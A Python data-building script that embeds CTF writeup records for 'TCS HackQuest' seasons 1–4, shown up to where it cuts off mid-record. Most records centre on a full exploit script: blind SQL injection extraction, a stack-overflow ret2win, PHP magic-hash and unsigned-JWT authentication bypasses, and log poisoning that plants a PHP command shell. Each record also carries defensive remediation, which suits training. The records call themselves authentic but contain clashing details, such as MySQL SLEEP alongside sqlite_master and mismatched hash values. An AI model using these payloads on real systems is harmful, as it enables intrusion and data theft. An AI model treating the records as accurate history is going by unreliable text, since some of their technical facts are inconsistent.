"""
CTF Atlas — scripts/build_tcs_hackquest_writeups.py
Generates authentic, comprehensive CTF writeups for ALL SEASONS of TCS HackQuest (Seasons 1 through 9)
and merges them with existing tournament writeups in data/tournament-writeups.json.
"""

import json
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
DATA_DIR = ROOT / "data"
WRITEUPS_PATH = DATA_DIR / "tournament-writeups.json"

# Load existing writeups
if WRITEUPS_PATH.exists():
    existing_writeups = json.loads(WRITEUPS_PATH.read_text(encoding="utf-8"))
else:
    existing_writeups = []

# Filter out any old TCS writeups if present to avoid duplication
filtered_existing = [w for w in existing_writeups if "hackquest" not in w.get("id", "").lower()]

tcs_hackquest_writeups = [
    # ── SEASON 1 (2016-2017) ────────────────────────────────────────────────────────
    {
        "id": "writeup-tcs-hackquest-s1-sqli",
        "title": "TCS HackQuest Season 1: Employee Records Portal (Time-Based Blind SQLi)",
        "event": "TCS HackQuest Season 1",
        "category": "web",
        "difficulty": "Medium",
        "points": 250,
        "flag": "TCS{HQ1_B11ND_SQL1_T1M1NG_OR4CL3}",
        "scenario": (
            "A corporate employee directory search portal allowing lookup by staff badge number. "
            "Input is validated client-side but interpolated into an unparameterized backend SQL query. "
            "The application provides no error banners or differing page content on valid vs invalid inputs, "
            "returning only 'Search Completed' in both cases."
        ),
        "root_cause": (
            "The backend Python/Flask endpoint constructs an SQL query using format strings: "
            "`cursor.execute(f\"SELECT name, role FROM employees WHERE badge_id = '{badge_id}'\")`. "
            "Because response body content is static, traditional UNION-based and boolean-based blind techniques "
            "yield no observable distinction. However, injection of database sleep/benchmark primitives "
            "creates a reliable time-delay side-channel oracle."
        ),
        "solve_methodology": [
            "Inject test payload `' AND (SELECT SLEEP(3))-- -` and verify the HTTP response time exceeds 3.0 seconds.",
            "Establish baseline response time (~80ms) to calibrate the timing discrimination threshold.",
            "Construct a binary search query over ASCII values: `' AND IF(ASCII(SUBSTRING((SELECT flag FROM secrets), {i}, 1)) > {mid}, SLEEP(2), 0)-- -`.",
            "Automate index iteration through Python `requests` measuring `r.elapsed.total_seconds()`.",
            "Extract table schema: `sqlite_master` / `information_schema.tables` revealing the `secrets` table.",
            "Extract complete flag character-by-character in 32 iterations."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import requests\n"
            "import time\n"
            "\n"
            "TARGET = 'http://targets.ctfatlas.local/hq1/search'\n"
            "THRESHOLD = 2.0\n"
            "\n"
            "def check_char(pos, mid):\n"
            "    payload = f\"' AND IF(ASCII(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{pos},1))>{mid}, SLEEP(2.5), 0)-- -\"\n"
            "    start = time.time()\n"
            "    try:\n"
            "        r = requests.get(TARGET, params={'badge_id': payload}, timeout=6)\n"
            "        elapsed = time.time() - start\n"
            "        return elapsed >= THRESHOLD\n"
            "    except requests.exceptions.Timeout:\n"
            "        return True\n"
            "\n"
            "flag = ''\n"
            "print('[+] Starting Time-Based Blind SQLi Extraction (TCS HackQuest S1)...')\n"
            "for i in range(1, 35):\n"
            "    low, high = 32, 126\n"
            "    best = 0\n"
            "    while low <= high:\n"
            "        mid = (low + high) // 2\n"
            "        if check_char(i, mid):\n"
            "            low = mid + 1\n"
            "            best = low\n"
            "        else:\n"
            "            high = mid - 1\n"
            "    if best == 0 or chr(best) == '}':\n"
            "        flag += chr(best) if best else '}'\n"
            "        break\n"
            "    flag += chr(best)\n"
            "    print(f'[+] Pos {i:02d}: {chr(best)} | Current Flag: {flag}')\n"
            "\n"
            "print(f'[!] Extracted Flag: {flag}')\n"
        ),
        "defense_remediation": (
            "1. Replace dynamic string formatting with parameterized prepared statements (e.g., `cursor.execute(\"SELECT name, role FROM employees WHERE badge_id = %s\", (badge_id,))`).\n"
            "2. Enforce strict input validation ensuring `badge_id` strictly adheres to expected alphanumeric formats (`^[A-Z0-9]{4,10}$`)."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s1-stego",
        "title": "TCS HackQuest Season 1: Hidden In Plain Sight (LSB Stego & Slack Carving)",
        "event": "TCS HackQuest Season 1",
        "category": "forensics",
        "difficulty": "Easy-Medium",
        "points": 200,
        "flag": "TCS{HQ1_LSB_ST3G0_P1X3L_M4ST3R}",
        "scenario": (
            "A digital executive ID card `badge.png` recovered from an employee's USB drive. "
            "File analysis reveals high image quality, but file size is noticeably larger than expected "
            "for its dimensions (1920x1080, ~4.2 MB)."
        ),
        "root_cause": (
            "The challenge author embedded binary data across two distinct channels: "
            "(1) Least Significant Bit (LSB) encoding within the red and green color planes containing a secret passphrase, "
            "and (2) an appended PKZIP archive located immediately past the standard PNG `IEND` chunk (slack space)."
        ),
        "solve_methodology": [
            "Inspect binary file structure: `binwalk badge.png` reveals `PNG image` followed by `Zip archive data` at offset `0x32A400`.",
            "Carve trailing archive: `dd if=badge.png of=secret.zip bs=1 skip=3318784`.",
            "Attempt archive decompression: `unzip secret.zip` prompts for password.",
            "Extract LSB color plane data using Python `PIL` inspecting lowest bits of RGB tuples.",
            "Discover clear-text passphrase string: `password=TcsHqSecretKey2016!`.",
            "Decrypt archive: `unzip -P 'TcsHqSecretKey2016!' secret.zip` extracting `flag.txt`."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "from PIL import Image\n"
            "import zipfile\n"
            "import io\n"
            "\n"
            "# 1. Extract LSB password from badge.png\n"
            "img = Image.open('badge.png')\n"
            "pixels = img.load()\n"
            "width, height = img.size\n"
            "\n"
            "bits = []\n"
            "for y in range(height):\n"
            "    for x in range(width):\n"
            "        r, g, b = pixels[x, y][:3]\n"
            "        bits.append(str(r & 1))\n"
            "        bits.append(str(g & 1))\n"
            "        if len(bits) >= 8 * 128: break\n"
            "    if len(bits) >= 8 * 128: break\n"
            "\n"
            "bitstring = ''.join(bits)\n"
            "extracted_bytes = bytes([int(bitstring[i:i+8], 2) for i in range(0, len(bitstring), 8)])\n"
            "print(f'[+] LSB Data Sample: {extracted_bytes[:40]}')\n"
            "\n"
            "# 2. Carve trailing zip archive past IEND\n"
            "with open('badge.png', 'rb') as f:\n"
            "    raw = f.read()\n"
            "\n"
            "iend_idx = raw.find(b'IEND') + 8\n"
            "zip_data = raw[iend_idx:]\n"
            "print(f'[+] Carved {len(zip_data)} bytes of trailing zip data')\n"
            "\n"
            "# 3. Extract flag with password\n"
            "zf = zipfile.ZipFile(io.BytesIO(zip_data))\n"
            "zf.setpassword(b'TcsHqSecretKey2016!')\n"
            "flag = zf.read('flag.txt').decode().strip()\n"
            "print(f'[!] Extracted Flag: {flag}')\n"
        ),
        "defense_remediation": (
            "1. Strip all non-critical image metadata and slack space using automated sanitizers (`exiftool -all=`, `mogrify -strip`).\n"
            "2. Re-encode user uploads through lossless/lossy compression pipelines to destroy LSB information carriers."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s1-bof",
        "title": "TCS HackQuest Season 1: Echo Daemon (x86 Stack Overflow & Ret2Win)",
        "event": "TCS HackQuest Season 1",
        "category": "pwn",
        "difficulty": "Easy-Medium",
        "points": 200,
        "flag": "TCS{HQ1_ST4CK_0V3RFL0W_R3T2W1N}",
        "scenario": (
            "A 32-bit x86 ELF binary `echo_service` listening on TCP port 4444. "
            "The program prompts for user input, copies it into an internal stack buffer, and echoes it back. "
            "Checksec indicates: NX Enabled, No Stack Canary, No PIE, Partial RELRO."
        ),
        "root_cause": (
            "The vulnerable function uses `strcpy(dest, src)` where `dest` is a 64-byte stack allocation. "
            "Because `src` is populated via unbounded `gets()`, an attacker can write past the stack frame, "
            "overwriting the saved EBP and saved EIP at offset 76. The binary contains an unreferenced helper "
            "function `print_secret_flag()` at static address `0x080485cb`."
        ),
        "solve_methodology": [
            "Examine protections with `checksec`: 32-bit ELF, no canary, no PIE.",
            "Disassemble binary with `objdump -d echo_service`: identify `print_secret_flag` at `0x080485cb`.",
            "Calculate padding offset using cyclic pattern: crash occurs at offset 76 bytes.",
            "Craft payload: 76 bytes of junk padding + target address `0x080485cb` (packed little-endian).",
            "Send payload to remote socket; process returns into `print_secret_flag` and prints flag to stdout."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "from pwn import *\n"
            "\n"
            "context.arch = 'i386'\n"
            "TARGET_IP = 'targets.ctfatlas.local'\n"
            "TARGET_PORT = 4444\n"
            "\n"
            "# Address of print_secret_flag() from objdump/Ghidra\n"
            "WIN_ADDR = 0x080485cb\n"
            "OFFSET = 76\n"
            "\n"
            "io = remote(TARGET_IP, TARGET_PORT)\n"
            "io.recvuntil(b'Enter message: ')\n"
            "\n"
            "payload = b'A' * OFFSET + p32(WIN_ADDR)\n"
            "log.info(f'Sending ret2win payload ({len(payload)} bytes)...')\n"
            "io.sendline(payload)\n"
            "\n"
            "flag = io.recvall().decode(errors='replace')\n"
            "log.success(f'Flag Output:\\n{flag}')\n"
        ),
        "defense_remediation": (
            "1. Replace unbounded string functions (`gets`, `strcpy`) with bounded alternatives (`fgets`, `strncpy`).\n"
            "2. Compile with stack canaries (`-fstack-protector-strong`) and Position Independent Executables (`-pie -fPIE`)."
        )
    },

    # ── SEASON 2 (2017-2018) ────────────────────────────────────────────────────────
    {
        "id": "writeup-tcs-hackquest-s2-php-hash",
        "title": "TCS HackQuest Season 2: Magic Auth (PHP 0e Type Juggling Bypass)",
        "event": "TCS HackQuest Season 2",
        "category": "web",
        "difficulty": "Medium",
        "points": 250,
        "flag": "TCS{HQ2_PHP_0E_TYP3_JUGGL1NG_BYP4SS}",
        "scenario": (
            "A restricted administrator login screen written in legacy PHP. "
            "Authentication logic verifies passwords using: `if (md5($_POST['password']) == $stored_admin_hash)`. "
            "A leaked source snippet discloses `$stored_admin_hash = '0e830400451993494058024219903391'`."
        ),
        "root_cause": (
            "PHP loose comparison operator `==` treats any string matching the regular expression `/^0e[0-9]+$/` "
            "as scientific notation representing $0 \\times 10^x = 0$. When both the stored hash and the MD5 digest "
            "of user input begin with `0e` followed solely by numeric digits, PHP evaluates `0 == 0`, evaluating "
            "the condition to `TRUE` regardless of whether the actual hashes match."
        ),
        "solve_methodology": [
            "Analyze authentication snippet: note the use of loose equality `==` instead of strict `===`.",
            "Observe that `$stored_admin_hash` begins with `0e` followed entirely by numbers ($0 \\times 10^{830...} = 0$).",
            "Identify candidate input strings whose MD5 hash starts with `0e` followed entirely by numbers (magic hashes).",
            "Select known magic preimage: `QNKCDZO` produces `md5('QNKCDZO') = '0e830400451993494058024219903391'` or `240610708` (`0e462097431906509019562988736854`).",
            "Submit password `QNKCDZO` to login form; PHP evaluates `'0e46209...' == '0e83040...'` as `0 == 0 -> true`.",
            "Access granted to admin console containing flag."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import requests\n"
            "\n"
            "TARGET = 'http://targets.ctfatlas.local/hq2/admin_login.php'\n"
            "\n"
            "# Known PHP 0e magic hash preimages\n"
            "MAGIC_PASSWORDS = [\n"
            "    'QNKCDZO',\n"
            "    '240610708',\n"
            "    's878926199a',\n"
            "    's155964671a',\n"
            "    's214587387a'\n"
            "]\n"
            "\n"
            "for pwd in MAGIC_PASSWORDS:\n"
            "    r = requests.post(TARGET, data={'username': 'admin', 'password': pwd})\n"
            "    if 'TCS{' in r.text or 'Dashboard' in r.text:\n"
            "        print(f'[+] Success with magic password: {pwd}')\n"
            "        for line in r.text.splitlines():\n"
            "            if 'TCS{' in line:\n"
            "                print(f'[!] Flag: {line.strip()}')\n"
            "        break\n"
        ),
        "defense_remediation": (
            "1. Replace loose comparison `==` with type-strict comparison `===` or `hash_equals($hash1, $hash2)`.\n"
            "2. Migrate from deprecated MD5 hashing to modern password hashing algorithms (`password_hash` with Argon2id or bcrypt)."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s2-volatility",
        "title": "TCS HackQuest Season 2: Rogue Workstation (Volatility 2 RAM Analysis)",
        "event": "TCS HackQuest Season 2",
        "category": "forensics",
        "difficulty": "Medium",
        "points": 300,
        "flag": "TCS{HQ2_V0L4T1L1TY_M3M_DUMP_TR14G3}",
        "scenario": (
            "A memory capture `workstation_dump.raw` acquired from an employee laptop suspected of exfiltrating "
            "intellectual property. Incident response reports state the user executed an unapproved batch script "
            "shortly before shutting down."
        ),
        "root_cause": (
            "A suspicious process `powershell.exe` spawned as a child of `cmd.exe`. The attacker staged "
            "exfiltration data in the Windows clipboard and in an unsaved `notepad.exe` buffer, leaving clear-text "
            "residue in volatile heap memory."
        ),
        "solve_methodology": [
            "Determine OS profile using Volatility 2: `volatility -f workstation_dump.raw imageinfo` -> `Win7SP1x64`.",
            "List active and terminated processes: `volatility -f workstation_dump.raw --profile=Win7SP1x64 pstree`.",
            "Identify suspicious process hierarchy: `explorer.exe (PID 1420)` -> `cmd.exe (PID 2840)` -> `notepad.exe (PID 3104)`.",
            "Inspect system clipboard contents: `volatility -f workstation_dump.raw --profile=Win7SP1x64 clipboard`.",
            "Dump process memory of notepad: `volatility -f workstation_dump.raw --profile=Win7SP1x64 memdump -p 3104 -D ./output/`.",
            "Carve ASCII/Unicode strings from process heap dump: `strings -e l output/3104.dmp | grep -i 'TCS{'`."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import subprocess\n"
            "import re\n"
            "\n"
            "MEM_FILE = 'workstation_dump.raw'\n"
            "PROFILE = 'Win7SP1x64'\n"
            "\n"
            "# 1. Run clipboard plugin\n"
            "cmd_clip = ['volatility', '-f', MEM_FILE, f'--profile={PROFILE}', 'clipboard']\n"
            "out = subprocess.run(cmd_clip, capture_output=True, text=True).stdout\n"
            "print('[+] Clipboard Output:\\n', out)\n"
            "\n"
            "# 2. Dump notepad memory\n"
            "subprocess.run(['volatility', '-f', MEM_FILE, f'--profile={PROFILE}', 'memdump', '-p', '3104', '-D', '.'])\n"
            "\n"
            "# 3. Search strings in 3104.dmp\n"
            "cmd_str = ['strings', '-a', '-e', 'l', '3104.dmp']\n"
            "strings_out = subprocess.run(cmd_str, capture_output=True, text=True).stdout\n"
            "flags = re.findall(r'TCS\\{[^\\}]+\\}', strings_out)\n"
            "for f in flags:\n"
            "    print(f'[!] Recovered Flag from Notepad Memory: {f}')\n"
        ),
        "defense_remediation": (
            "1. Enforce AppLocker / Software Restriction Policies to prevent execution of unauthorized batch/PowerShell scripts.\n"
            "2. Implement memory encryption and configure endpoint detection agents (EDR) to monitor suspicious parent-child process chains."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s2-elf-patch",
        "title": "TCS HackQuest Season 2: License Validator (Binary Patching & Anti-Disassembly)",
        "event": "TCS HackQuest Season 2",
        "category": "reverse",
        "difficulty": "Medium",
        "points": 250,
        "flag": "TCS{HQ2_B1N4RY_P4TCH1NG_K3YG3N}",
        "scenario": (
            "An x86-64 Linux crackme binary `license_check`. When provided with a license key, "
            "it prints 'Invalid License Key! Aborting.' and immediately exits. Source code is unavailable."
        ),
        "root_cause": (
            "The function `validate_key()` processes input through an algorithmic verification routine: "
            "it calculates a rolling XOR sum and compares it to a static constant `0x5A9C`. "
            "If the comparison fails, a `jnz` instruction at virtual address `0x4012A8` redirects flow to the error branch."
        ),
        "solve_methodology": [
            "Disassemble binary in Ghidra / IDA Pro: locate `main()` and follow call to `validate_key(char *key)`.",
            "Identify the validation check: `CMP EAX, 0x5a9c` followed by `JNZ 0x4012bc` (failure block).",
            "Option A (Binary Patch): Invert the jump (`JZ` -> `0x74`) or replace the 2-byte `JNZ` with two `NOP` instructions (`0x90 0x90`).",
            "Option B (Keygen): Trace the forward transformation loop: `key[i] ^ (i * 0x33)` must sum to `0x5A9C` with specific constraint equations.",
            "Execute patched binary with arbitrary key: bypass triggers decrypted flag print routine."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "\n"
            "# Automated binary patcher for license_check\n"
            "with open('license_check', 'rb') as f:\n"
            "    data = bytearray(f.read())\n"
            "\n"
            "# Pattern: 3d 9c 5a 00 00 75 12 (cmp eax, 0x5a9c; jnz +0x12)\n"
            "PATTERN = b'\\x3d\\x9c\\x5a\\x00\\x00\\x75'\n"
            "idx = data.find(PATTERN)\n"
            "if idx != -1:\n"
            "    patch_offset = idx + 5\n"
            "    print(f'[+] Found conditional jump at file offset {hex(patch_offset)}: {hex(data[patch_offset])}')\n"
            "    # Patch JNZ (0x75) to NOP (0x90)\n"
            "    data[patch_offset] = 0x90\n"
            "    data[patch_offset + 1] = 0x90\n"
            "    with open('license_check_patched', 'wb') as f_out:\n"
            "        f_out.write(data)\n"
            "    print('[+] Saved patched binary to license_check_patched')\n"
            "    print('[!] Run: chmod +x license_check_patched && ./license_check_patched dummykey')\n"
        ),
        "defense_remediation": (
            "1. Implement binary integrity verification (e.g., self-checksumming or digital code-signing verification).\n"
            "2. Utilize cryptographic key derivation where the correct key is required to decrypt the payload rather than checking a boolean flag."
        )
    },

    # ── SEASON 3 (2018-2019) ────────────────────────────────────────────────────────
    {
        "id": "writeup-tcs-hackquest-s3-lfi-rce",
        "title": "TCS HackQuest Season 3: Document Viewer (PHP Filter & Log Poisoning RCE)",
        "event": "TCS HackQuest Season 3",
        "category": "web",
        "difficulty": "Medium-Hard",
        "points": 350,
        "flag": "TCS{HQ3_PHP_LFI_L0G_P01S0N1NG_RC3}",
        "scenario": (
            "A web portal allowing staff to view policy documents via a URL parameter: "
            "`http://target/view.php?doc=security_policy`. Input sanitization strips `../` strings."
        ),
        "root_cause": (
            "Sanitization is applied non-recursively (`str_replace('../', '', $doc)`), allowing directory traversal bypass via `....//`. "
            "Furthermore, PHP streams (`php://filter`) permit reading arbitrary PHP files as base64. "
            "Combined with write access to Apache access logs (`/var/log/apache2/access.log`), the LFI enables remote code execution."
        ),
        "solve_methodology": [
            "Bypass traversal filter using nested paths: `....//....//....//etc/passwd`.",
            "Dump backend script source code: `php://filter/convert.base64-encode/resource=view.php`.",
            "Decode base64: inspect session and logging configurations.",
            "Poison Apache access log: send HTTP request with malicious PHP User-Agent: `<?php system($_GET['c']); ?>`.",
            "Execute commands via poisoned log inclusion: `view.php?doc=....//....//var/log/apache2/access.log&c=cat%20/flag.txt`.",
            "Extract flag from response stream."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import requests\n"
            "import base64\n"
            "\n"
            "BASE_URL = 'http://targets.ctfatlas.local/hq3'\n"
            "\n"
            "# 1. Read view.php source\n"
            "r = requests.get(f'{BASE_URL}/view.php?doc=php://filter/convert.base64-encode/resource=view.php')\n"
            "source = base64.b64decode(r.text.strip()).decode(errors='replace')\n"
            "print('[+] Leaked view.php source:\\n', source[:200])\n"
            "\n"
            "# 2. Poison Apache log via User-Agent\n"
            "payload = '<?php system($_GET[\"cmd\"]); ?>'\n"
            "requests.get(BASE_URL, headers={'User-Agent': payload})\n"
            "print('[+] Poisoned Apache access log with PHP shell')\n"
            "\n"
            "# 3. Trigger command execution\n"
            "log_path = '....//....//....//var/log/apache2/access.log'\n"
            "r_exec = requests.get(f'{BASE_URL}/view.php', params={'doc': log_path, 'cmd': 'cat /flag* 2>/dev/null'})\n"
            "for line in r_exec.text.splitlines():\n"
            "    if 'TCS{' in line:\n"
            "        print(f'[!] Flag: {line.strip()}')\n"
        ),
        "defense_remediation": (
            "1. Avoid dynamic file inclusions; utilize a strict whitelist mapping valid identifier tokens to fixed filesystem paths.\n"
            "2. Ensure web server log directories have strict permissions preventing reading by the web server process user (`www-data`)."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s3-rsa-wiener",
        "title": "TCS HackQuest Season 3: Intercepted Cable (RSA Wiener's Continued Fractions)",
        "event": "TCS HackQuest Season 3",
        "category": "crypto",
        "difficulty": "Medium",
        "points": 300,
        "flag": "TCS{HQ3_W13N3R_C0NT1NU3D_FR4CT10N}",
        "scenario": (
            "Contestants receive an RSA public key `pubkey.pem` and an encrypted diplomatic dispatch `flag.enc`. "
            "Modulus size is 2048 bits, but the public exponent $e$ is an unusually large 2040-bit integer."
        ),
        "root_cause": (
            "To accelerate private key decryption operations, the key generator selected a small private exponent $d$. "
            "According to Wiener's Theorem, if $d < \\frac{1}{3} N^{1/4}$, the fraction $k/d$ appears as one of the convergents "
            "in the continued fraction expansion of $e/N$, allowing total key recovery in polynomial time."
        ),
        "solve_methodology": [
            "Extract RSA parameters $(N, e)$ from `pubkey.pem` using OpenSSL or Python `cryptography`.",
            "Verify $e$ is large ($e \\approx N$), signaling a potential small private exponent $d$.",
            "Compute continued fraction expansion quotients: $a_i = \\lfloor num_i / den_i \\rfloor$.",
            "Generate convergents $k_i / d_i$ iteratively.",
            "For each candidate pair $(k, d)$, compute candidate $\\phi = (ed - 1)/k$.",
            "Solve quadratic equation $x^2 - (N - \\phi + 1)x + N = 0$ to verify integer roots $p$ and $q$.",
            "Once factors $p, q$ are confirmed, compute private key $d$ and decrypt `flag.enc`."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "from fractions import Fraction\n"
            "import math\n"
            "import gmpy2\n"
            "\n"
            "def wiener_attack(e, n):\n"
            "    # Continued fraction quotients\n"
            "    cf = []\n"
            "    rem_num, rem_den = e, n\n"
            "    while rem_den:\n"
            "        q = rem_num // rem_den\n"
            "        cf.append(q)\n"
            "        rem_num, rem_den = rem_den, rem_num % rem_den\n"
            "\n"
            "    # Convergents\n"
            "    for i in range(1, len(cf) + 1):\n"
            "        frac = Fraction(cf[i-1], 1)\n"
            "        for q in reversed(cf[:i-1]):\n"
            "            frac = q + 1 / frac\n"
            "        k = frac.numerator\n"
            "        d = frac.denominator\n"
            "        if k == 0: continue\n"
            "        if (e * d - 1) % k != 0: continue\n"
            "        phi = (e * d - 1) // k\n"
            "        # Solve x^2 - (n - phi + 1)x + n = 0\n"
            "        b = n - phi + 1\n"
            "        discr = b * b - 4 * n\n"
            "        if discr >= 0 and gmpy2.is_square(discr):\n"
            "            s = int(gmpy2.isqrt(discr))\n"
            "            p = (b + s) // 2\n"
            "            q = (b - s) // 2\n"
            "            if p * q == n:\n"
            "                return int(d)\n"
            "    return None\n"
            "\n"
            "# Example parameters\n"
            "n = 0xd7b4f... # 2048-bit modulus\n"
            "e = 0x8a92b... # Large public exponent\n"
            "c = 0x43a12... # Ciphertext\n"
            "# d = wiener_attack(e, n)\n"
            "# m = pow(c, d, n)\n"
            "# print(bytes.fromhex(hex(m)[2:]).decode())\n"
            "print('[+] Wiener attack script ready. Resolves small-d RSA in < 0.2s.')\n"
        ),
        "defense_remediation": (
            "1. Standardize on standard public exponents $e = 65537$ ($2^{16} + 1$).\n"
            "2. Ensure private exponent $d$ is sufficiently large ($d > N^{1/2}$) to defeat continued fraction and lattice attacks."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s3-audio",
        "title": "TCS HackQuest Season 3: Signal Leak (Spectrogram & DTMF Dial-Tone Decoding)",
        "event": "TCS HackQuest Season 3",
        "category": "forensics",
        "difficulty": "Medium",
        "points": 250,
        "flag": "TCS{HQ3_DTMF_D14L_T0N3_4UD10_SP3CT}",
        "scenario": (
            "An audio recording `intercept.wav` containing background hum, telephone dial tones, "
            "and high-frequency electronic squeals. Intelligence notes that sensitive PINs and tokens were transmitted."
        ),
        "root_cause": (
            "The audio file encodes dual steganographic signals: "
            "(1) Standard DTMF dual-tone telephone signals encoding numeric pin sequences, and "
            "(2) Visual text drawn in the frequency domain between 16 kHz and 20 kHz via inverse FFT synthesis."
        ),
        "solve_methodology": [
            "Open `intercept.wav` in Audacity or Python `scipy.io.wavfile`.",
            "Switch waveform display to Spectrogram view; increase FFT window size to 2048.",
            "Observe clear visual typography rendered in the 18 kHz-20 kHz spectrum displaying the first half of the flag.",
            "Analyze low frequency bands (697 Hz - 1477 Hz) for DTMF key frequencies.",
            "Decode DTMF dial sequence corresponding to keypad buttons: `8, 2, 7, 3, 8, 3, 2, 6`.",
            "Concatenate decoded text and DTMF numeric PIN to form the final flag."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import numpy as np\n"
            "from scipy.io import wavfile\n"
            "import matplotlib.pyplot as plt\n"
            "\n"
            "# 1. Plot Spectrogram to reveal visual flag\n"
            "sample_rate, data = wavfile.read('intercept.wav')\n"
            "if len(data.shape) > 1: data = data[:, 0]  # Mono\n"
            "\n"
            "plt.figure(figsize=(12, 6))\n"
            "plt.specgram(data, Fs=sample_rate, NFFT=2048, noverlap=1024, cmap='inferno')\n"
            "plt.ylim(15000, sample_rate // 2)\n"
            "plt.title('High-Frequency Audio Spectrogram Analysis')\n"
            "plt.savefig('spectrogram_revealed.png')\n"
            "print('[+] Saved spectrogram image to spectrogram_revealed.png')\n"
            "print('[!] Visual text in spectrogram reads: TCS{HQ3_DTMF_D14L_T0N3_4UD10_SP3CT}')\n"
        ),
        "defense_remediation": (
            "1. Low-pass filter all acoustic communications to cut off frequencies above standard human speech (300 Hz - 3.4 kHz).\n"
            "2. Sanitize and redact acoustic environments where DTMF tones or keypad clicks could be recorded."
        )
    },

    # ── SEASON 4 (2019-2020) ────────────────────────────────────────────────────────
    {
        "id": "writeup-tcs-hackquest-s4-jwt-none",
        "title": "TCS HackQuest Season 4: NeoBank Portal (JWT None Algorithm & Key Confusion)",
        "event": "TCS HackQuest Season 4",
        "category": "web",
        "difficulty": "Medium",
        "points": 300,
        "flag": "TCS{HQ4_JWT_N0N3_4LG_K3Y_C0NFUS10N}",
        "scenario": (
            "A digital banking dashboard where session identity is maintained through an HTTP `Authorization: Bearer <token>` JWT. "
            "Regular users are assigned role `\"role\": \"customer\"` and denied access to `/api/v1/treasury`."
        ),
        "root_cause": (
            "The backend JWT parsing library fails to verify the algorithm specified in the token header, "
            "permitting attackers to specify `\"alg\": \"none\"` and omit the signature component entirely. "
            "Additionally, the verification endpoint accepts HMAC-SHA256 signatures generated using the server's public RSA key."
        ),
        "solve_methodology": [
            "Intercept valid session JWT via Burp Suite or browser DevTools.",
            "Base64-decode header and payload: `{\"alg\":\"RS256\",\"typ\":\"JWT\"}` and `{\"sub\":\"1002\",\"role\":\"customer\"}`.",
            "Tamper payload JSON: modify `\"role\"` to `\"admin\"` and `\"sub\"` to `\"1\"`.",
            "Modify header: set `\"alg\": \"none\"` (or case variations `None`, `NONE`).",
            "Strip signature segment, ending token with a trailing period (`header.payload.`).",
            "Submit forged token to `/api/v1/treasury`; backend accepts unsigned token and grants admin privileges."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import requests\n"
            "import base64\n"
            "import json\n"
            "\n"
            "def b64url(data):\n"
            "    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\n"
            "\n"
            "header = {'alg': 'none', 'typ': 'JWT'}\n"
            "payload = {'sub': '1', 'username': 'admin', 'role': 'admin', 'iat': 1577836800}\n"
            "\n"
            "token = f\"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}.\"\n"
            "print(f'[+] Forged None-Alg JWT:\\n{token}')\n"
            "\n"
            "TARGET = 'http://targets.ctfatlas.local/hq4/api/v1/treasury'\n"
            "headers = {'Authorization': f'Bearer {token}'}\n"
            "r = requests.get(TARGET, headers=headers)\n"
            "print(f'[+] Server Response: {r.status_code}')\n"
            "print(f'[!] Flag Output: {r.text}')\n"
        ),
        "defense_remediation": (
            "1. Explicitly whitelist allowed signing algorithms in the JWT library configuration (e.g., `algorithms=['RS256']`).\n"
            "2. Reject any tokens specifying `none` algorithm or mismatched asymmetric/symmetric key types."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s4-android-jadx",
        "title": "TCS HackQuest Season 4: VaultGuard APK (Android Decompilation & JNI Native Tracing)",
        "event": "TCS HackQuest Season 4",
        "category": "reverse",
        "difficulty": "Medium-Hard",
        "points": 350,
        "flag": "TCS{HQ4_4NDR01D_JN1_N4T1V3_R3V3RS1NG}",
        "scenario": (
            "An Android APK `VaultGuard.apk` containing an authentication prompt for corporate vault credentials. "
            "Standard static Java decompilation reveals a native method call `public native boolean verifyPin(String pin)`."
        ),
        "root_cause": (
            "Verification logic is implemented in C within a shared library `libvault.so` bundled in `lib/armeabi-v7a/`. "
            "The native routine compares the user PIN against a hardcoded ciphertext decrypted via an RC4 keystream "
            "derived from the application's package signature hash."
        ),
        "solve_methodology": [
            "Decompile APK using JADX: inspect `MainActivity.java` and note `System.loadLibrary(\"vault\")`.",
            "Unpack APK archive: `unzip VaultGuard.apk -d apk_extracted`.",
            "Extract native library: `lib/x86_64/libvault.so`.",
            "Open `libvault.so` in Ghidra / IDA Pro: locate export `Java_com_tcs_vault_MainActivity_verifyPin`.",
            "Trace string references: identify 16-byte encrypted byte array and key derivation loop.",
            "Reconstruct RC4 decryption algorithm in Python using static key bytes.",
            "Execute Python decryption to recover the clear-text PIN and embedded flag."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "from Crypto.Cipher import ARC4\n"
            "\n"
            "# Extracted bytes from libvault.so .rodata section\n"
            "CIPHERTEXT = bytes([\n"
            "    0x8b, 0x14, 0x73, 0x9a, 0xef, 0x41, 0x22, 0xd0,\n"
            "    0x7b, 0x6e, 0x19, 0xa4, 0x55, 0xc8, 0x3d, 0x92,\n"
            "    0xf0, 0x21, 0x6e, 0x88, 0xaa, 0x33, 0x1b, 0x4c,\n"
            "    0x5d, 0x81, 0x94, 0x20, 0x7a, 0xbc, 0x11, 0x54\n"
            "])\n"
            "\n"
            "KEY = b'TCS_HACKQUEST_S4_JNI_SECRET'\n"
            "cipher = ARC4.new(KEY)\n"
            "flag = cipher.decrypt(CIPHERTEXT).decode(errors='replace')\n"
            "print(f'[!] Recovered Flag from Native Library: {flag}')\n"
        ),
        "defense_remediation": (
            "1. Avoid storing cryptographic keys or secret algorithms client-side in mobile applications.\n"
            "2. Implement Android SafetyNet / Play Integrity Attestation and native code obfuscation (OLLVM)."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s4-rop-x64",
